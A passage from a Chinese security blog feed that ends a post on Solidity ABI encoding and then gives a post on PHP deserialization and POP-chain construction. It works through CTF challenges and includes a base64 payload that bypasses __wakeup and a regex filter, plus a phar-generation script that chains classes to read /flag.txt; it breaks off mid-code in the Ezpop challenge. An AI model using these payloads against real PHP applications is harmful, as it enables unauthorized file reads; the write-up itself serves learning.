<strong>length</strong>（两个数组元素）：<code>0x0000000000000000000000000000000000000000000000000000000000000002</code>；</p></li><li><p>第二个参数的第一个数组元素：<code>0x0000000000000000000000000000000000000000000000000000000000000456</code>；</p></li><li><p>第二个参数的第二个数组元素：<code>0x0000000000000000000000000000000000000000000000000000000000000789</code>；</p></li><li><p>第四个参数的 <strong>length</strong>（13 个字节）：<code>0x000000000000000000000000000000000000000000000000000000000000000d</code>；</p></li><li><p>第四个参数的数据部分（需要对 <strong>Hello, World!</strong> 进行编码，如下图）：<code>0x48656c6c6f2c20776f726c642100000000000000000000000000000000000000</code>；</p><p><img src="/image/%E5%90%88%E7%BA%A6%E8%B0%83%E7%94%A8/6.png" alt="6"></p></li></ul></li><li><p>将结果合在一起：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x8be65246</span><br><span class="line">  0000000000000000000000000000000000000000000000000000000000000123</span><br><span class="line">  0000000000000000000000000000000000000000000000000000000000000080</span><br><span class="line">  3132333435363738393000000000000000000000000000000000000000000000</span><br><span class="line">  00000000000000000000000000000000000000000000000000000000000000e0</span><br><span class="line">  0000000000000000000000000000000000000000000000000000000000000002</span><br><span class="line">  0000000000000000000000000000000000000000000000000000000000000456</span><br><span class="line">  0000000000000000000000000000000000000000000000000000000000000789</span><br><span class="line">  000000000000000000000000000000000000000000000000000000000000000d</span><br><span class="line">  48656c6c6f2c20776f726c642100000000000000000000000000000000000000 </span><br></pre></td></tr></table></figure></li></ul><h4 id="0x05-ABI函数"><a href="#0x05-ABI函数" class="headerlink" title="0x05 ABI函数"></a>0x05 ABI函数</h4><ul><li><p><code>abi.encodePacked(...) returns (bytes)</code>：对给点参数执行紧打包编码，即</p><ul><li>对函数选择器不进行编码；</li></ul></li><li><p>长度低于32字节的类型，即不会进行补0操作，也不会进行符号扩展；</p><ul><li>动态类型会直接进行编码，并且不包含长度信息。</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract AbiTest &#123;</span><br><span class="line">    uint public a = block.difficulty;</span><br><span class="line">    function AbiEncodePacked() public view returns (bytes memory) &#123;</span><br><span class="line">        bytes memory result  = abi.encodePacked(a);</span><br><span class="line">        return result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/image/%E5%90%88%E7%BA%A6%E8%B0%83%E7%94%A8/image-20220423224621777.png" alt="image-20220423224621777"></p></li><li><p><code>abi.encodeWithSelector(bytes4 selector, ...) returns (bytes)</code>：对给定的第二个参数开始的参数进行编码，并以给定的函数选择器作为起始的4字节数据一起返回</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract AbiTest &#123;</span><br><span class="line">    uint public a = block.difficulty;</span><br><span class="line"></span><br><span class="line">    function encodeWithSelector() public  view returns(bytes memory)&#123;</span><br><span class="line">        bytes memory result = abi.encodeWithSelector(this.encodeWithSelector.selector,a);</span><br><span class="line">        return result;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/image/%E5%90%88%E7%BA%A6%E8%B0%83%E7%94%A8/image-20220423230914216.png" alt="image-20220423230914216"></p></li><li><p><code>abi.encodeWithSignature(string signature, ...) returns (bytes)</code>:与<code>encodeWithSelector</code>等价</p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;0x01-Basic-Design&quot;&gt;&lt;a href=&quot;#0x01-Basic-Design&quot; class=&quot;headerlink&quot; title=&quot;0x01 Basic Design&quot;&gt;&lt;/a&gt;0x01 Basic Design&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;AB</summary>
      
    
    
    
    <category term="区块链" scheme="https://banana69.site/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
    
    <category term="智能合约" scheme="https://banana69.site/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/"/>
    
  </entry>
  
  <entry>
    <title>PHP反序列化及POP链构造</title>
    <link href="https://banana69.site/2021/10/16/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>https://banana69.site/2021/10/16/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2021-10-16T01:24:02.000Z</published>
    <updated>2021-10-17T12:35:52.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="0x01-原理介绍"><a href="#0x01-原理介绍" class="headerlink" title="0x01 原理介绍"></a>0x01 原理介绍</h4><p>php反序列化即所有php中的值都可以使用 serialize() 函数来返回一个包含字节流的字符串来表示，如以下代码。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str</span>  = <span class="string">&quot;this is a str&quot;</span>;</span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="string">&quot;name&quot;</span>=&gt;<span class="string">&quot;Bob&quot;</span>,<span class="string">&quot;sex&quot;</span>=&gt;<span class="string">&quot;m&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$a</span> = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$b</span> = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">C</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable">$b</span> = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//字符串str序列化操作：s:13:&quot;this is a str&quot; s:16表示字符串长度为16</span></span><br><span class="line"><span class="comment">//数组arr序列化操作：a:2:&#123;s:4:&quot;name&quot;;s:3:&quot;Bob&quot;;s:3:&quot;sex&quot;;s:1:&quot;m&quot;;&#125;</span></span><br><span class="line"><span class="comment">//类A序列化操作：O:1:&quot;A&quot;:1:&#123;s:1:&quot;a&quot;;i:1;&#125; O代表对象，A是类名，a是类实例化后的对象名，i是数值型</span></span><br><span class="line"><span class="comment">//类B序列化操作：O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;i:1;&#125;</span></span><br></pre></td></tr></table></figure><p>由于序列化一个对象会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字，所以A和B序列化后的代码除了类名都是相同的。而unserialize()函数就是将序列化后的值返回 <strong>php</strong> 原来的值。</p><ul><li><p>反序列化中的魔术方法：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">__construct()<span class="comment">//当一个对象创建时被调用</span></span><br><span class="line">__destruct() <span class="comment">//当一个对象销毁时被调用</span></span><br><span class="line">__toString() <span class="comment">//当一个对象被当作一个字符串使用</span></span><br><span class="line">__sleep()<span class="comment">//在对象在被序列化之前运行</span></span><br><span class="line">__wakeup()<span class="comment">//将在反序列化之后立即被调用(通过序列化对象元素个数不符来绕过)</span></span><br><span class="line">__get()<span class="comment">//读取不可访问（protected 或 private）或不存在的属性的值时被调用</span></span><br><span class="line">__set()<span class="comment">//在给不可访问（protected 或 private）或不存在的属性赋值时</span></span><br><span class="line">__invoke()<span class="comment">//当以调用函数的方式调用一个对象时会执行</span></span><br><span class="line">__call()<span class="comment">//当调用一个对象中的不能用的方法的时候就会执行这个函数</span></span><br><span class="line">__isset()   <span class="comment">//当对不可访问（protected 或 private）或不存在的属性调用 isset() 或 empty() 时，__isset() 会被调用</span></span><br></pre></td></tr></table></figure></li></ul><ul><li><p><strong>public、protected与private</strong> 区别：</p><ul><li><p><strong>protected：</strong></p><p>protected 声明的字段为保护字段，在所声明的类和该类的子类中可见，但在该类的对象实例中不可见。因此保护字段的字段名在序列化时字段名前会加上<code>\0*\0</code>的前缀，这里的<code>\0</code>表示 ASCII 码为 0 的字符（不可见字符），不是<code>\0</code>字符串。</p><p>所以在输入反序列化值时需要给保护变量前加上<code>\0*\0</code>，例如：</p><p><code>O:4:&quot;Name&quot;:2:&#123;s:11:&quot;\0*\0username&quot;;s:5:&quot;admin&quot;;s:11:&quot;\0*\0password&quot;;i:100;&#125;</code></p></li><li><p><strong>private：</strong></p><p>private 声明的字段为私有字段，只有其声明的类中可见，在该类的子类和该类的对象实例中均不可见。因此私有字段的字段名在序列化时，类名和字段名前都会加上<code>\0</code>的前缀，字符串长度也包括所加前缀的长度，其中<code>\0</code>字符也是计算长度的，例如：</p><p><code>O:4:&quot;Name&quot;:3：&#123;s:14:&quot;\0Name\0username&quot;;s:5:&quot;admin&quot;;s:14:&quot;\0Name\0password&quot;;i:100;&#125;</code></p><p>在浏览器中提交时可以用<code>%00</code>来替换<code>\0</code>，使用 <strong>url</strong> 编码，使用 <strong>PHP</strong> 输出时可以用使用<code>urlencode()</code>函数。</p></li></ul></li></ul><h4 id="0x02-漏洞产生"><a href="#0x02-漏洞产生" class="headerlink" title="0x02 漏洞产生"></a>0x02 漏洞产生</h4><p>当 <strong>serialize()</strong> 函数执行时首先会检查是否存在魔术方法 <code>__sleep()</code>，当该魔术方法存在时会被首先调用，然后才执行序列化操作。而 <code>unserialize()</code> 函数执行时会检查存在一个 <code>__wakeup()</code> 魔术方法，若存在该魔术方法则会先调用 <code>__wakeup()</code>。所以漏洞的根源在于 <code>unserialize()</code> 函数的参数可控。</p><p>例如该代码中存在反序列化漏洞：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xctf</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$flag</span> = <span class="string">&#x27;111&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">exit</span>(<span class="string">&#x27;bad requests&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注：当反序列化时的字符串所对应的对象的数目被修改，<code>__wake()</code> 的函数就不会被调用. 并且不会重建为对象, 但是会触发其他的魔术方法比如 <strong>__destruct()</strong></p><p>所以针对以上代码构造序列化值：<code>O:4:&quot;xctf&quot;:1:&#123;s:4:&quot;flag&quot;;s:4:&quot;111&quot;;&#125;</code>,修改对应的字符串数目即可绕过 <code>wakeup()</code>。</p><p><img src="/image/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1.png" alt="1"></p><h4 id="0x02-实践学习"><a href="#0x02-实践学习" class="headerlink" title="0x02 实践学习"></a>0x02 实践学习</h4><h5 id="①-Web-php-unserialize"><a href="#①-Web-php-unserialize" class="headerlink" title="① Web_php_unserialize"></a>① Web_php_unserialize</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123;  <span class="comment">//定义一个类</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span>; <span class="comment">//变量属性</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123; <span class="comment">//类方法</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = <span class="variable">$file</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="literal">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123; <span class="comment">//wakeup()函数返回index.php，所以必须绕过</span></span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>])) &#123; </span><br><span class="line">    <span class="variable">$var</span> = base64_decode(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>]); </span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$var</span>)) &#123; <span class="comment">//正则检查</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;stop hacking!&#x27;</span>); </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        @unserialize(<span class="variable">$var</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    highlight_file(<span class="string">&quot;index.php&quot;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>根据代码分析返回 <strong>fl4g.php</strong> 必须要满足以下条件：</p><ol><li><p>绕过 wakeup() 函数</p><p>当反序列化时的字符串所对应的对象的数目被修改,<code>_wake()</code>的函数就不会被调用。</p></li><li><p>绕过正则表达式</p><p><code>preg_match(&#39;/[oc]:\d+:/i&#39;, $var)</code>该正则表达式的意思是若字符串出现 “o:数字” 或者 “c:数字’ 这样的格式被过滤。</p><p>使用<code>O：+4</code>来绕过</p></li><li><p>对序列化的内容进行 <strong>Base64</strong> 加密</p></li></ol><p>由于代码中的 <strong>file</strong> 为私有变量，所以序列化之后的字符串开头结尾各有一个空白字符（即**%00<strong>），字符串长度也比实际长度大 ，如果将序列化结果复制到在线的 <strong>base64</strong> 网站进行编码可能就会丢掉空白字符，这里直接在</strong>PHP** 代码中实现。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = <span class="variable">$file</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="literal">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line">    <span class="variable">$A</span> = <span class="keyword">new</span> Demo(<span class="string">&#x27;fl4g.php&#x27;</span>);</span><br><span class="line">    <span class="variable">$var</span> = serialize(<span class="variable">$A</span>);</span><br><span class="line"><span class="variable">$var</span> = str_replace(<span class="string">&#x27;O:4&#x27;</span>, <span class="string">&#x27;O:+4&#x27;</span>,<span class="variable">$var</span>);<span class="comment">//绕过preg_match</span></span><br><span class="line"><span class="variable">$var</span> = str_replace(<span class="string">&#x27;:1:&#x27;</span>, <span class="string">&#x27;:2:&#x27;</span>,<span class="variable">$var</span>);<span class="comment">//绕过wakeup</span></span><br><span class="line"><span class="keyword">echo</span>(<span class="variable">$var</span>);</span><br><span class="line"><span class="comment">//O:+4:&quot;Demo&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;fl4g.php&quot;;&#125;</span></span><br><span class="line"><span class="keyword">echo</span> base64_encode(<span class="variable">$var</span>);</span><br><span class="line"></span><br><span class="line"> <span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>payload：</strong><code>TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==</code></p><h5 id="②-phar-反序列化："><a href="#②-phar-反序列化：" class="headerlink" title="② phar 反序列化："></a>② phar 反序列化：</h5><p><strong>phar</strong> 可以理解为 <strong>php</strong> 压缩文档，它可以把多个文件归档到同一个文件中，而且不经过解压就能被 <strong>php</strong> 访问并执行，与 <code>file://，php://</code>等伪协议类似，也是一种流包装器。</p><p><strong>phar</strong> 由四部分组成：</p><ul><li><strong>stub：</strong> <strong>phar</strong> 文件标识，格式为 <code>xxx&lt;?php xxx; __HALT_COMPILER();?&gt;；</code></li><li><strong>manifest：</strong>压缩文件的属性等信息，以序列化存储；</li><li><strong>contents：</strong>压缩文件的内容；</li><li><strong>signature：</strong>签名，放在文件末尾。</li></ul><blockquote><p>注意：</p><ol><li>这里的文件标识必须以<code>__HALT_COMPILER();?&gt;</code>结尾，但是之前的内容没有限制，即可以通过伪造一个图片文件或者 pdf 文件来绕过一些上传限制；</li><li>phar 存储的 meta-data 信息以序列化的方式存储，当文件操作函数通过 phar:// 伪协议解析 phar 文件就会将数据反序列化，可以使用常用函数结合文件伪造，通过<code>phar://</code>伪协议解析造成反序列化攻击，如以下文件操作函数</li></ol></blockquote><table><thead><tr><th>文件操作函数</th><th></th><th></th><th></th></tr></thead><tbody><tr><td>fileatime</td><td>filectime</td><td>file_exists</td><td>file_get_contents</td></tr><tr><td>file_put_contents</td><td>file</td><td>filegroup</td><td>fopen</td></tr><tr><td>is_dir</td><td>is_executable</td><td>is_file</td><td>is_link</td></tr><tr><td>is_readable</td><td>is_writable</td><td>is_writeable</td><td>parse_ini_file</td></tr><tr><td>copy</td><td>unlink</td><td>stat</td><td>readfile</td></tr></tbody></table><p>例题：[CISCN2019 华北赛区 Day1 Web1]Dropbox</p><p>在登录后有文件上传的功能，在上传文件后可以进行文件删除和文件下载的操作。下载文件操作通过 <strong>POST</strong> 请求传递 <strong>filename</strong> 参数来完成的，这里可以构造参数尝试进行任意文件下载，得到源码</p><p><img src="/image/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/2.png" alt="2"></p><p><strong>index.php:</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> FileList(<span class="variable">$_SESSION</span>[<span class="string">&#x27;sandbox&#x27;</span>]);</span><br><span class="line"><span class="variable">$a</span>-&gt;Name();</span><br><span class="line"><span class="variable">$a</span>-&gt;Size();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>继而可以下载到 <strong>class.php，delete.php，download.php</strong>。</p><p>对代码进行分析后， <strong>class.php</strong>的 <strong>File</strong> 类中的 <strong>close</strong> 方法可以读取文件内容；</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>User</strong> 类中存在 <strong>close</strong> 方法，当该对象被销毁时会去执行 <strong>close</strong> 方法；</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;db-&gt;close();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><strong>FileList</strong> 类中存在 <strong>__call</strong> 魔术方法，且该类中不存在 <strong>close</strong> 方法，如果一个 <strong>FileList</strong> 对象掉用了 <strong>close()</strong> 方法，就可以通过 <strong>__call</strong> 方法去执行 <strong>close</strong> 方法；</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$results</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$funcs</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        array_push(<span class="keyword">$this</span>-&gt;funcs, <span class="variable">$func</span>); <span class="comment">// 向$this-&gt;funcs数组尾部添加$func</span></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;files <span class="keyword">as</span> <span class="variable">$file</span>) &#123; <span class="comment">//遍历数组</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;name()][<span class="variable">$func</span>] = <span class="variable">$file</span>-&gt;<span class="variable">$func</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以可以梳理出解题的思路：</p><ol><li>创建一个 user 对象，其 db 变量是一个 FileList 对象，且对象中的 files 参数为 flag 的位置。</li><li>当 user 对象被销毁时，db 变量的 close 方法会被执行；</li><li>db 变量不存在 close 方法，会触发 FileList 中的 __call 魔术方法，即执行 File 对象中的 close 方法；</li><li>close 方法执行后存在 result 变量的结果会被加入到 table 变量中打印出来。</li></ol><p>生成 phar 文件：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$results</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$funcs</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$file</span> = <span class="keyword">new</span> File();</span><br><span class="line">        <span class="variable">$file</span>-&gt;filename = <span class="string">&#x27;/flag.txt&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files = <span class="keyword">array</span>(<span class="variable">$file</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;results = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;funcs = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@unlink(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line"><span class="comment">//$phar -&gt; setStub(&#x27;GIF89a&#x27;.&#x27;<span class="meta">&lt;?php</span> __HALT_COMPILER();<span class="meta">?&gt;</span>&#x27;);   </span></span><br><span class="line"><span class="comment">//设置stub，增加gif文件头</span></span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> User();</span><br><span class="line"><span class="variable">$o</span>-&gt;db = <span class="keyword">new</span> FileList();</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$o</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;exp.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后通过删除功能去利用<code>php://</code>伪协议去解析 <strong>phar</strong> 文件，会将 <strong>meta-data</strong> 进行反序列化：</p><p><img src="/image/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/3.png" alt="3"></p><h5 id="③-MRCTF2020-Ezpop（构造-pop链）"><a href="#③-MRCTF2020-Ezpop（构造-pop链）" class="headerlink" title="③ MRCTF2020-Ezpop（构造 pop链）"></a>③ MRCTF2020-Ezpop（构造 pop链）</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Welcome to index.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="comment">//WTF IS THIS?</span></span><br><span class="line"><span class="comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span></span><br><span class="line"><span class="comment">//And Crack It!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to &#x27;</span>.<span class="keyword">$this</span>-&gt;source.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span 